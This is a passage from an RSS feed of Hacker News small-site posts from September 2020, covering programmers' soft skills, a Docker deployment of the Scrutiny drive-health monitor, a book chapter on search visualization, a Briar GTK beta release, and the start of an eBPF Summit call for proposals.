development.</p><h2>Collaboration</h2><p>Chances are very high that you with other people as a programmer. You will have to work with other developers, business people, managers, open source contributors, stakeholders, and countless other people even if you are a freelancer or entrepreneur. Learning how to work well with different people and their personalities is critical.</p><p>There are so many things that contribute to good collaboration. The first is knowing that one person can't do everything, or at least do everything well. Different people have different skills, points of view, and life experiences that are more powerful in combination than isolation. Don't feel like you always need to "put the team on your back" or be everything to everybody. You can be a lot better if you allow other people to contribute too.</p><p>Ask other people for help, and be willing to help people in return. You don't need to be an expert in everything, and different people will be experts in different things. Rely on other people, and if you are stuck on something make sure to ask for help so that you don't stay stuck for too long. When somebody asks you for help, be willing to help them. You can learn a lot by explaining things well, and you will be able to reinforce your knowledge of the topic. If you're in a management position, make sure to give people time for mentorship and effective collaboration!</p><p>Along the same lines, don't talk over people or immediately dismiss their viewpoints. They will probably be much less likely to contribute in the future if their opinions aren't valued or taken into account. Actively listen when people share their ideas -- instead of thinking about your response or why your idea is better while they are talking, try to think about why their approach is also good or how it could be implemented.</p><p>Then, once you implement their awesome ideas, give them credit for those ideas. Nothing has made me less effective as an employee as being on a team where my ideas were dismissed, under-valued, and un-credited by other people on my team.</p><h2>Communication</h2><p>When you are working with other people, whether those people are co-workers, clients, the people who use your projects, managers, or people you manage, good communication is crucial. Give honest updates on how things are going, where projects currently stand, and your opinions on things honestly but kindly. People will be less receptive to feedback if you are rude or unconstructive. But, if you are dishonest or sugar-coat the truth, then you may not see a positive change. There's definitely a fine line here.</p><p>One real life example from my life: I had somebody who read one of my blog posts write a very long letter about how dumb I sound because of the tone I take. I usually use a lot of exclamation points and try to sound exciting in my posts -- and that's very intentional to try and make topics that can be intimidating or boring more fun. The person got pretty sexist in this email and said some pretty hurtful things. That being said, I probably could scale back on the exclamation points and still get people excited about programming. I would have been a lot more receptive to that point if the person had framed the criticism more constructively.</p><p>If things are not going well, make sure to say so. Be honest about needing a deadline pushed back, or how something isn't going well at work. You will have a much better chance at changing it and making the environment better for yourself if you speak up.</p><h2>Inclusiveness</h2><p>I used to work as a rock climbing instructor and counselor at a summer camp, and the age group I worked with most were middle school girls. They were some of my favorite people I've ever worked with, but, that being said, middle schoolers aren't usually the most accepting of difference or that clique-adverse. We used to run a game where we started out in one large circle, and then one counselor would tell people they were "out of the circle", and they would have to leave the game based on some characteristic that they weren't informed of and couldn't control. The people still inside the circle would play a game, and the people outside of the circle were excluded and just had to watch from afar.</p><p>This activity was super effective in showing these girls what it was like to be left out for reasons outside of your control, and I still think back on it a lot. As adults, we still leave people out of the circle and exclude them based on certain characteristics outside their control, but if we let them back into the circle and allow them to contribute then our products draw on more diverse experiences and are better. <strong>There's <a href="https://hbr.org/2016/11/why-diverse-teams-are-smarter">a lot of research</a> on more diverse teams performing better, but from an individual perspective, think about what it feels like to be left out of the circle and try to make your circle larger, not smaller.</strong> Chances are, a lot of your users may be people that have traditionally been left out of the circle in tech. I can tell you from my own experience, that it's really difficult to be the only person like you on a team as someone who's been on a team with another woman for ~5% of my programming career.</p><p>This also links into empathy -- make sure that you are making your programs for a wide variety of users. Not just the able-bodied or those with cutting-edge internet or technologies. You will be able to reach more people.</p><h2>Patience</h2><p>The first person that you need to have patience with when you are programming is yourself. <strong>Programming is hard</strong> and sometimes you will have bugs or difficult problems to overcome. If it's always easy, then you aren't challenging yourself, and you aren't growing as a programmer. Have the tenacity to keep working through a problem and not give up when it gets hard. But, also, know that you can take a break and come back to the problem in a little while. Maybe taking a break will help you solve the problem more efficiently or to see it differently when you come back to it.</p><p>Also, be patient with other people. Things can take a while to learn and people are not perfect. Making mistakes and failing can be some of the most important experiences in the learning process, so allow for that instead of creating an environment where it isn't safe to take risks or grow. Understand that different things click more easily for different people, and know that learning can take a while.</p><h2>Creativity</h2><p>My favorite thing about being a programmer is that I get to use my creative energy to build things that other people can then benefit from. You get to think outside of the box to create really cool things.</p><p>Having creative ideas is important for coming up with ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://welearncode.com/most-important-nonprogramming/">https://welearncode.com/most-important-nonprogramming/</a></em></p>]]>
            </description>
            <link>https://welearncode.com/most-important-nonprogramming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577876</guid>
            <pubDate>Thu, 24 Sep 2020 12:21:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Scrutiny to monitor your drives]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577806">thread link</a>) | @theorangeone
<br/>
September 24, 2020 | https://theorangeone.net/posts/scrutiny/ | <a href="https://web.archive.org/web/*/https://theorangeone.net/posts/scrutiny/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After recently deploying a ZFS pool, I realized I had little insight into the health of my drives. I can run SMART stats now and then, but that‚Äôs not quite the same.</p><h2 id="scrutiny"><a href="#scrutiny">#</a> Scrutiny</h2><p><a href="https://github.com/AnalogJ/scrutiny">Scrutiny</a> is a tool to help you with just that. It presents a web UI which shows you statistics on your drives, based on SMART reports, and reports their health.</p><p>When <a href="https://www.reddit.com/r/selfhosted/comments/icreui/scrutiny_hard_drive_smart_monitoring_historical/">originally announced</a>, you could only get access if you <a href="https://github.com/sponsors/AnalogJ/">supported the author</a>, however now enough people have supported, the project is completely free and open source. Can‚Äôt say I‚Äôm personally a huge fan of this model, but people who make great software should be rewarded, and I think Scrutiny is <strong>great</strong> software!</p><h2 id="deploying"><a href="#deploying">#</a> Deploying</h2><p>Scrutiny is written in Go meaning, if you so wish, you can deploy it by downloading a single binary, and running that. I however, prefer deploying things as docker containers. Fortunately, there‚Äôs both an <a href="https://hub.docker.com/r/analogj/scrutiny">official one</a>, and <a href="https://hub.docker.com/r/linuxserver/scrutiny">one provided by the LinuxServer.io folks</a>.</p><p>Scrutiny is split into 2 components: the web UI and the collector. Currently, the collector requires that the container be run <code>--privileged</code>, so it can run SMART reports correctly. This can pose security issues, as it defeats many of the isolations Docker puts in place for you. Instead, both containers support running just 1 of the entry points, meaning the collector can be run privileged, but not the web UI, massively decreasing the attack surface.</p><div><pre><code data-lang="yaml"><span>version</span><span>:</span><span> </span><span>"2.3"</span><span>
</span><span>
</span><span></span><span>services</span><span>:</span><span>
</span><span>  </span><span>web</span><span>:</span><span>
</span><span>    </span><span>image</span><span>:</span><span> </span>linuxserver/scrutiny<span>:</span>latest<span>
</span><span>    </span><span>ports</span><span>:</span><span>
</span><span>      </span>- <span>"7278:8080"</span><span>
</span><span>    </span><span>volumes</span><span>:</span><span>
</span><span>      </span>- ./config<span>:</span>/config<span>
</span><span>    </span><span>environment</span><span>:</span><span>
</span><span>      </span>- SCRUTINY_WEB=<span>true</span><span>
</span><span>      </span>- PUID=<span>3000</span><span>
</span><span>      </span>- PGID=<span>3000</span><span>
</span><span>    </span><span>restart</span><span>:</span><span> </span>unless-stopped<span>
</span><span>
</span><span>  </span><span>collector</span><span>:</span><span>
</span><span>    </span><span>image</span><span>:</span><span> </span>linuxserver/scrutiny<span>:</span>latest<span>
</span><span>    </span><span>privileged</span><span>:</span><span> </span><span>true</span><span>
</span><span>    </span><span>volumes</span><span>:</span><span>
</span><span>      </span>- /dev/disk<span>:</span>/dev/disk<span>
</span><span>      </span>- /run/udev<span>:</span>/run/udev<span>:</span>ro<span>
</span><span>      </span>- ./config<span>:</span>/config<span>
</span><span>    </span><span>environment</span><span>:</span><span>
</span><span>      </span>- SCRUTINY_COLLECTOR=<span>true</span><span>
</span><span>      </span>- SCRUTINY_API_ENDPOINT=http<span>:</span>//web<span>:</span><span>8080</span><span>
</span><span>      </span>- PUID=<span>3000</span><span>
</span><span>      </span>- PGID=<span>3000</span><span>
</span><span>    </span><span>restart</span><span>:</span><span> </span>unless-stopped<span>
</span></code></pre></div><h2 id="usage"><a href="#usage">#</a> Usage</h2><p>When you first load up the Scrutiny UI, you‚Äôll be met with a message that there‚Äôs no data. This is normal. Because Scrutiny only collects data each day at midnight, you‚Äôll need to run the initial import yourself:</p><div><pre><code data-lang="fallback">docker-compose exec collector scrutiny-collector-metrics run
</code></pre></div><p>This will collect metrics for your drives, and report them back to the Scrutiny web process for storage. Once that‚Äôs complete, reload the web UI and you‚Äôll be met with some statistics about your drives.</p><figure><a href="https://theorangeone.net/posts/scrutiny/scrutiny-drive-list_hu43e0e4259e39e327d7144370023b5af3_89067_1500x0_resize_lanczos_2.png" target="_blank"><img src="https://theorangeone.net/posts/scrutiny/scrutiny-drive-list_hu43e0e4259e39e327d7144370023b5af3_89067_1500x0_resize_lanczos_2.png" alt="Scrutiny homepage, showing the drives connected to my server"></a><figcaption><small>Scrutiny homepage, showing the drives connected to my server</small></figcaption></figure><p>Here you can see all the drives connected to your server, along with a summary of the health of each drive.</p><p>Clicking on a drive shows you more statistics, and specific metrics from the SMART report.</p><figure><a href="https://theorangeone.net/posts/scrutiny/scrutiny-drive-details_hu55c38c76048b7706e61b18016b8e5133_96229_1500x0_resize_lanczos_2.png" target="_blank"><img src="https://theorangeone.net/posts/scrutiny/scrutiny-drive-details_hu55c38c76048b7706e61b18016b8e5133_96229_1500x0_resize_lanczos_2.png" alt="Details of a specific drive in Scrutiny"></a><figcaption><small>Details of a specific drive in Scrutiny</small></figcaption></figure><h2 id="future"><a href="#future">#</a> Future</h2><p>Scrutiny is a pretty young project, but the quality of the project, responsiveness of the author, and utility of it are incredible!</p><p>There are some features missing, most notably alerts (although I hear this is in the works). <a href="https://blog.ktz.me/"><code>@IronicBadger</code></a> also <a href="https://blog.ktz.me/scrutiny-a-smart-hard-drive-monitoring-tool/#feature-requests">made some requests</a> for future features, which it‚Äôd be great to see interested.</p><p>I‚Äôm definitely leaving this deployed on my machine, and can‚Äôt wait to see how this project develops.</p></div></div>]]>
            </description>
            <link>https://theorangeone.net/posts/scrutiny/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577806</guid>
            <pubDate>Thu, 24 Sep 2020 12:11:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Information Visualization for Search Interfaces (2009)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577758">thread link</a>) | @smusamashah
<br/>
September 24, 2020 | http://searchuserinterfaces.com/book/sui_ch10_visualization.html | <a href="https://web.archive.org/web/*/http://searchuserinterfaces.com/book/sui_ch10_visualization.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="chapter_10"><p>From the book <i>Search User Interfaces</i>, published by Cambridge University Press.  Copyright ¬© 2009 by Marti A. Hearst.</p>

<p>
The preceding chapters have discussed user interfaces to support search, with a focus on what is known to be successful (from a usability perspective) for the vast majority of searchers. This and the following chapter describe efforts to improve search interfaces by incorporating <i> visual</i> information into the display using techniques from the field of <i> information visualization</i>. </p><p>
The human perceptual system is highly attuned to images, and visual representations can communicate some kinds of information more rapidly and effectively than text. For example, the familiar bar chart or line graph can be much more evocative of the underlying data than the corresponding table of numbers (<a href="http://searchuserinterfaces.com/book/sui_references.html#larkin1987dsw" title="JH&nbsp;Larkin and
  HA&nbsp;Simon.
Why a diagram is (sometimes) worth 10,000 words.
<i>Cognitive Science</i>, 11(1):65‚Äì99, 1987.">Larkin and Simon, 1987a</a>). The goal of information visualization is to translate abstract information into a visual form that provides new insight about that information. Visualization has been shown to be successful at providing insight about data for a wide range of tasks. </p>


<p>
The field of information visualization is a vibrant one, with hundreds of innovative ideas burgeoning on the Web. However, applying visualization to textual information is quite challenging, especially when the goal is to improve search over text collections. As discussed in earlier chapters, search is a means towards some other end, rather than a goal in itself. When reading text, one is focused on that task; it is not possible to read and visually perceive something else at the same time. Furthermore, the nature of text makes it difficult to convert it to a visual analogue. </p><p>
Most likely for these reasons, applications of visualization to general search have not been widely accepted to date, and few usability results are positive. For example, <a href="http://searchuserinterfaces.com/book/sui_references.html#chen2000esi" title="C.&nbsp;Chen and Y.&nbsp;Yu.
Empirical studies of information visualization: a meta-analysis.
<i>International Journal of Human-Computers Studies</i>, 53(5):851‚Äì866,
  2000.">Chen and Yu, 2000</a> conducted a meta-analysis of information visualization usability studies, with a focus on information retrieval problems. The purpose of a meta-analysis is to combine many different points in the evaluation space in order to come up with more robust and general results. <a href="http://searchuserinterfaces.com/book/sui_references.html#chen2000esi" title="C.&nbsp;Chen and Y.&nbsp;Yu.
Empirical studies of information visualization: a meta-analysis.
<i>International Journal of Human-Computers Studies</i>, 53(5):851‚Äì866,
  2000.">Chen and Yu, 2000</a> focused on six visualization interface studies from five papers (<a href="http://searchuserinterfaces.com/book/sui_references.html#robertson1998dmu" title="G.&nbsp;Robertson, M.&nbsp;Czerwinski, K.&nbsp;Larson, D.C. Robbins,
  D.&nbsp;Thiel, and M.&nbsp;van Dantzich.
Data mountain: using spatial memory for document management.
<i>Proceedings of the 11th annual ACM symposium on User Interface Software
  and Technology (UIST'98)</i>, pages 153‚Äì162, 1998.">Robertson et&nbsp;al.,   1998</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#allen2000ida" title="B.&nbsp;Allen.
Individual differences and the conundrums of user-centered design: Two
  experiments.
<i>Journal of the American Society for Information Science</i>,
  51(6):508‚Äì520, 2000."> Allen, 2000</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#sebrechts1999vsr" title="M.M.
  Sebrechts, J.&nbsp;Vasilakis, M.S. Miller, J.V. Cugini, and S.J. Laskowski.
Visualization of Search Results: A Comparative Evaluation of Text, 2D and 3D
  Interfaces.
<i>Proceedings of the 22nd Annual International ACM SIGIR Conference on
  Research and development in information retrieval (SIGIR'99)</i>, pages
  3‚Äì10, 1999."> Sebrechts et&nbsp;al., 1999</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#swan1998awv" title="R.C. Swan and
  J.&nbsp;Allan.
Aspect Windows, 3-D Visualizations, and Indirect Comparisons of Information
  Retrieval Systems.
<i>Proceedings of the 21st Annual International ACM SIGIR Conference on
  Research and development in information retrieval (SIGIR'98)</i>, pages
  173‚Äì181, 1998."> Swan and Allan, 1998</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#combs1999dzi" title="T.T.A. Combs
  and B.B. Bederson.
Does zooming improve image browsing?
<i>Proceedings of the fourth ACM Conference on Digital Libraries</i>,
  pages 130‚Äì137, 1999."> Combs and Bederson, 1999</a>). The conclusions of the meta-analysis were: </p>
<ul>
<li> Individual cognitive differences among participants, as opposed to differences among the interfaces, had the largest effect, especially on accuracy, and to some degree on efficiency, </li><li> Holding cognitive abilities constant, participants performed better with simpler visual-spatial interfaces than with complex ones, and </li><li> The combined effect of visualization in the studies was not statistically significant. </li></ul>
<p>
Thus, this meta-analysis found no evidence that visualization improved search performance. This is not to say that advanced visual representations cannot help improve search; rather that there are few proven successful ideas today. </p>
<p>
On the other hand, for analytical tasks, visualization of textual information appears more promising. A visualization that is not appropriate for a general search audience might instead be quite valuable for someone with expertise and deep interest in understanding data. Thus it is useful to follow make a distinction between visualization of text for the purposes of text analysis versus visualization for search. </p>
<p>
This and the following chapter are intended to be read together. This chapter provides a brief a summary of the core principles and standard tools of information visualization, followed by a discussion of how different data types are best visualized. This chapter also describes why visualizing nominal data, which includes textual data, is difficult. It then describes how researchers have attempted to improve search using visualization techniques. Chapter <a href="http://searchuserinterfaces.com/book/sui_ch11_text_analysis_visualization.html"><b>11</b></a> discusses the vibrant area of visualization for text analysis tasks. </p><div id="section_10.1"><h2>10.1: Principles of Information Visualization</h2>
<p>
Guidelines for designing information visualizations are available from writers such as Few (<a href="http://searchuserinterfaces.com/book/sui_references.html#few2006idd" title="S.&nbsp;Few.
<i>Information Dashboard Design: The Effective Visual Communication of
  Data</i>.
O'Reilly, 2006.">Few, 2006</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#few2009nys" title="S.&nbsp;Few.
<i>Now You See It: Simple Visualization Techniques for Quantitative
Analysis</i>.
Analytics Press, 2009."> Few, 2009</a>) and Tufte (<a href="http://searchuserinterfaces.com/book/sui_references.html#tufte83" title="Edward Tufte.
<i>The Visual Display of Quantitative Information</i>.
Graphics Press, Chelshire, CT, 1983.">Tufte, 1983</a>, <a href="http://searchuserinterfaces.com/book/sui_references.html#tufte1990ei" title="E.R. Tufte.
<i>Envisioning information</i>.
Graphics Press Cheshire, Conn.(PO Box 430, Cheshire 06410), 1990."> Tufte, 1990b</a>). Some of these guidelines overlap with guidelines from graphic design, including the need to present information clearly, precisely, and without extraneous or distracting clutter. Other guidelines relate to the special purposes of visualization. Good visualizations use graphics to organize information, highlight important information, allow for visual comparisons, and reveal patterns, trends, and outliers in the data. Visualization guidelines are also derived from principles of human perception, and urge the designer to be aware of the perceptual properties which can affect the design. <a href="http://searchuserinterfaces.com/book/sui_references.html#few2006idd" title="S.&nbsp;Few.
<i>Information Dashboard Design: The Effective Visual Communication of
  Data</i>.
O'Reilly, 2006.">Few, 2006</a> provides a good overview of these principles, which are described briefly below. </p><div id="figure_10.1"><p><a rel="lightbox" title="Figure 10.1(a)" href="http://searchuserinterfaces.com/book/images/healy1.png"><img src="http://searchuserinterfaces.com/book/images/healy1.png" width="200px"></a></p><p>(a)<br></p><p><a rel="lightbox" title="Figure 10.1(b)" href="http://searchuserinterfaces.com/book/images/healy2.png"><img src="http://searchuserinterfaces.com/book/images/healy2.png" width="200px"></a></p><p>(b)<br></p><p><b>Figure 10.1:</b>  (a) Viewers can preattentively recognize differences in color. (b) Viewers cannot preattentively recognize simultaneously variation of color plus shape. from <a href="http://searchuserinterfaces.com/book/sui_references.html#healy93" title="C.&nbsp;Healy.
<i>Visualization of Multivariate Data Using Preattentive
  Processing</i>.
PhD thesis, University of British Columbia Masters Thesis, 1993.
http://www.csc.ncsu.edu/faculty/healey/download/masters.pdf.">Healy, 1993</a>. 
</p><!-- end div caption --></div> <!-- end div figure --><p>
One important perceptual property is that of <i> preattentiveness</i> (<a href="http://searchuserinterfaces.com/book/sui_references.html#triesman1985ppv" title="A.&nbsp;Triesman.
Preattentive processing in vision.
<i>Computer Vision, Graphics and Image Processing</i>, 31:156‚Äì177,
  1985.">Triesman, 1985</a>). This term refers to visual properties that a person can perceive in fewer than 250 milliseconds, without having to scan the visual field serially (since eye movement and focus take about 200ms) (<a href="http://searchuserinterfaces.com/book/sui_references.html#ware2004ivp" title="C.&nbsp;Ware.
<i>Information Visualization: Perception for Design</i>.
Morgan Kaufmann, 2004.">Ware, 2004</a>). Preattentive observations take the same amount of time regardless of the number of objects being viewed. For example, people can accurately determine whether or not one red circle is presented among a field of blue circles in fewer than 200ms (see Figure <a href="#figure_10.1"><b>10.1</b></a>a). However, determining the <i> number</i> of items with the alternative color is <i> not</i> preattentive; it requires a serial scan of all the objects to do the counting (<a href="http://searchuserinterfaces.com/book/sui_references.html#healy93" title="C.&nbsp;Healy.
<i>Visualization of Multivariate Data Using Preattentive
  Processing</i>.
PhD thesis, University of British Columbia Masters Thesis, 1993.
http://www.csc.ncsu.edu/faculty/healey/download/masters.pdf.">Healy, 1993</a>). <i> Combinations</i> of properties are also usually not preattentive. Although people can detect one square among many circles of the same color (because the angular corners of the square are preattentively differentiated from the curves of the circles), the eye cannot detect the combination of the color distinction and the shape distinction simultaneously; this requires serial scanning. Figure <a href="#figure_10.1"><b>10.1</b></a>b shows an example; viewers cannot preattentively detect that there is a red, circular-shaped object among a field of blue and red circles and squares. </p>


<p>
Preattentiveness explains why a small amount of color highlighting against a white page is so effective at drawing the attention. As discussed in earlier chapters, a notable successful use of visual cues in search interfaces is color highlighting of query terms in documents, and bolding of query terms in document summaries in retrieval results. (However, if there are many colors in a display, color highlighting does not work well at drawing attention.) Note that not all cues in a visualization need to be preattentive to be useful; rather, it is important to know which visual components cause a preattentive reaction in order to know what will stand out in a display. </p>
<p>
Another important set of perceptual principles pertains to the visual components that are useful for making quantitative comparisons (<a href="http://searchuserinterfaces.com/book/sui_references.html#mackinlay1986adg" title="J.&nbsp;Mackinlay.
Automating the Design of Graphical Presentations of Relational Information.
<i>ACM Transactions on Graphics</i>, 5(2), 1986.">Mackinlay, 1986</a>). <a href="http://searchuserinterfaces.com/book/sui_references.html#bertin83" title="J.&nbsp;Bertin.
<i>Semiology of graphics</i>.
University of Wisconsin Press, 1983.">Bertin, 1983</a> defines a <i> graphical vocabulary</i> consisting of <i> marks</i> (points, lines, areas), <i> retinal variables</i> (color, size, shape, orientation, scale), and <i> position</i> (relative locations of marks within a spatial field). <a href="http://searchuserinterfaces.com/book/sui_references.html#cleveland1985egd" title="W.S. Cleveland.
<i>The elements of graphing data</i>.
Wadsworth Publ. Co. Belmont, CA, USA, 1985.">Cleveland, 1985</a> and <a href="http://searchuserinterfaces.com/book/sui_references.html#cleveland1984gpt" title="W.S.
  Cleveland and R.&nbsp;McGill.
Graphical Perception: Theory, Experimentation, and Application to the
  Development of Graphical Methods.
<i>Journal of the American Statistical Association</i>, 79(387):531‚Äì554,
  1984.">Cleveland and McGill, 1984</a> discuss the proper ways to combine these variables. For example, relative length can be assessed precisely, and so the relative positions of the tops of a row of bars in a bar chart can be used to accurately compare quantitative values. The perceptual system naturally associates a larger value to a larger size mark. The shape of lines are also evocative; a line graph can be used to indicate changes over time and other trends, and line cross-overs and relative positions are perceptually salient (see Figure <a href="#figure_10.3"><b>10.3</b></a>). </p>


<p>
<i> Gestalt principles</i> are also important for visualization (<a href="http://searchuserinterfaces.com/book/sui_references.html#few2006idd" title="S.&nbsp;Few.
<i>Information Dashboard Design: The Effective Visual Communication of
  Data</i>.
O'Reilly, 2006.">Few, 2006</a>). Among the most important of these is the principle of <i> proximity</i>, meaning that objects that are located spatially near one another are perceived as belonging to the same group. This principle is used extensively in interface design; for example, text labels are perceived to label those lines or entry forms that are nearest. Blank areas surrounding proximally close objects help contribute to the perception of grouping. Another gestalt principle, that of <i> similarity</i>, reflects the tendency to see objects that share the same visual attributes as being part of the same group. </p>

<div id="figure_10.2"><p><a rel="lightbox" title="Figure 10.2" href="http://searchuserinterfaces.com/book/images/auto-mpg-table.png"><img src="http://searchuserinterfaces.com/book/images/auto-mpg-table.png" width="400px"></a></p><p><b>Figure 10.2:</b>  A table of statistics about several brands of automobiles from the U.S., Europe, and Japan, from 1970-1979. 
</p><!-- end div caption --></div> <!-- end div figure --></div> <!-- end div section -->
<div id="section_10.2"><h2>10.2: Techniques for Interactive Visualization</h2>
<p>
Several interactive techniques are important to information visualization. In the technique known as <i> brushing and linking</i>, highlighting objects in one part of a visualization causes those same objects to be highlighted in a different view. For example, selecting points at the uppermost corner of a scatter plot would show the positions of those same points in a bar graph plotting other attributes of the same dataset. User interaction of this nature can improve comprehension and can help find interesting associations within the data. The brushing-and-linking technique is heavily used in text analysis interfaces. </p>

<p>
For large or densely packed visualizations, movie camera-style interaction techniques include providing an <i> overview</i> of the data, <i> zooming</i> in to see details or zooming out to see the bigger picture, and <i> panning</i> laterally across a view of the data. These kinds of interaction are used heavily in online map applications. Zooming has been found in several studies to be less optimal than showing multiple views of the same information when complex visual comparisons must be made (<a href="http://searchuserinterfaces.com/book/sui_references.html#plumlee2006zvm" title="M.&nbsp;Plumlee
  and C.&nbsp;Ware.
Zooming versus multiple window interfaces: Cognitive costs of visual
  comparisons.
<i>ACM Transactions on Computer-Human Interaction (TOCHI)</i>,
  13(2):179‚Äì209, 2006.">Plumlee and Ware, 2006</a>). </p>

<p>
The judicious use of <i> animation</i> is important in interactive visualization, to draw attention, retain ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://searchuserinterfaces.com/book/sui_ch10_visualization.html">http://searchuserinterfaces.com/book/sui_ch10_visualization.html</a></em></p>]]>
            </description>
            <link>http://searchuserinterfaces.com/book/sui_ch10_visualization.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577758</guid>
            <pubDate>Thu, 24 Sep 2020 12:04:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Beta Release of Briar GTK]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577727">thread link</a>) | @Funes-
<br/>
September 24, 2020 | https://nico.dorfbrunnen.eu/posts/2020/briar-beta/ | <a href="https://web.archive.org/web/*/https://nico.dorfbrunnen.eu/posts/2020/briar-beta/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section>
    <article>
      <header>
        
        <div>
          <p><span>
              <i></i>
              <time datetime="2020-09-10T00:00:00Z">
                September 10, 2020
              </time>
            </span>
            <span>
              <i></i>
              2 minutes read
            </span>
          </p>
          

          

        </div>
      </header>

      <div>
        <p>Almost half a year after releasing <a href="https://nico.dorfbrunnen.eu/posts/2020/briar-alpha/">the first alpha release of Briar GTK</a>, today marks the day of its first beta release. Much has happened in the meantime and many people, including me, were able to test Briar GTK and use it in regular occasions. Let‚Äôs have a look at how this first beta release looks like:</p>
<p><a href="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-1.png"><img src="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-1.png" alt="Briar GTK in conversation view with two contacts on the left in list and an option to delete the contact"></a></p>
<p>For those not knowing, <a href="https://briar.app/">Briar</a> is a messaging system that keeps information flowing all the time. Whether your internet connection has been cut due to natural disasters or because of governmental censorship, Briar will try its best to get your messages out there to your peers.</p>
<p>As you might already anticipate from the screenshot, it‚Äôs now much clearer which messages belong to which author. Additionally, on the left side you can see that Alice is online while Bob is offline. Support for this has landed in earlier alpha releases already. Another huge improvements to Briar‚Äôs UX is that you‚Äôre now able to copy content from messages. Beside being fully translated to German and Spanish and allowing to delete contacts, this beta release of Briar GTK also offers basic notification support. However, it depends on your desktop environment whether this will work for you.</p>
<p>Note that Briar GTK currently only supports private chats. Support for private groups and forums isn‚Äôt yet available in the <a href="https://code.briarproject.org/briar/briar/-/tree/master/briar-headless">Briar Headless API</a> and therefore those features can‚Äôt be used in Briar GTK.</p>
<p>Updating to the new version is as easy as calling <code>flatpak update</code> or installing the new .deb files. If you‚Äôre new to Briar GTK, you might want to look at its <a href="https://code.briarproject.org/briar/briar-gtk/-/blob/main/README.md#installation">installation instructions</a> to learn how to install it.</p>
<p>If you want to stay informed about what happens to the outer Briar universe, make sure to <a href="https://nico.dorfbrunnen.eu/tags/briar/index.xml">subscribe to this rss feed</a> which will keep you up-to-date on everything happening around Briar on this blog.</p>
<p><a href="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-4.png"><img src="https://nico.dorfbrunnen.eu/images/posts/2020/briar-beta/briar-gtk-screenshot-4.png" alt="Briar GTK in conversation view with two contacts on the left in list and an option to delete the contact"></a></p>
<p><em>All content in this blog post got released under a <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0 1.0 Universal Public Domain Dedication</a>. Feel free to share it with your peers!</em></p>

      </div>

      
    </article>

    
  </section>

      </div></div>]]>
            </description>
            <link>https://nico.dorfbrunnen.eu/posts/2020/briar-beta/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577727</guid>
            <pubDate>Thu, 24 Sep 2020 12:00:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to SCION]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577659">thread link</a>) | @matzf
<br/>
September 24, 2020 | https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion | <a href="https://web.archive.org/web/*/https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sidnlabs.nl/en/news-and-blogs/new-internet-infrastructures-an-introduction-to-scion</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577659</guid>
            <pubDate>Thu, 24 Sep 2020 11:49:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EBPF Summit 2020 ‚Äì CFP is now open]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24577647">thread link</a>) | @tgraf
<br/>
September 24, 2020 | https://ebpf.io/ebpf-summit-2020-cfp/ | <a href="https://web.archive.org/web/*/https://ebpf.io/ebpf-summit-2020-cfp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><div><div><div><div><p><span>October  28-29th, 2020</span><span>|</span><span>A Free Virtual Event</span></p><p>Call For Proposals</p><p>We‚Äôre excited to announce that the call for proposals is now open for the inaugural eBPF Summit, a virtual event, targeted at DevOps, platform architects and developers.</p><p>The summit is offered at no cost, and will include keynotes from those leading the open source eBPF community including eBPF power-users as well as user lightning talks. Participants will have a chance to ask questions to the speakers and chat with peers on a Slack forum. We‚Äôre inviting eBPF users, contributors and community members to participate in this virtual gathering.</p></div></div><div><h2>About the eBPF Summit</h2><p>eBPF is quickly becoming one of the most talked about technologies in our industry - enabling a new generation of networking, tracing, observability and security infrastructure. The eBPF Summit is targeted at users and potential users of this groundbreaking technology - both those looking at leveraging eBPF directly or via one of the projects leveraging eBPF (e.g. bpftrace, Cilium, Falco etc.).</p></div><div><h2>Confirmed Keynote Speakers</h2><div><div><p><img src="https://ebpf.io/static/alexey-starovoitov-8f8f40922a4ab69a1153f7920aa30952.png" alt="Alexei Starovoitov"></p><h3>Alexei Starovoitov</h3><div><p>Co-maintainer eBPF,</p><p>Facebook</p></div></div><div><p><img src="https://ebpf.io/static/brendan-gregg-95ac4a84726a2854fc08eeccf4efb3cc.png" alt="Brendan Gregg"></p><h3>Brendan 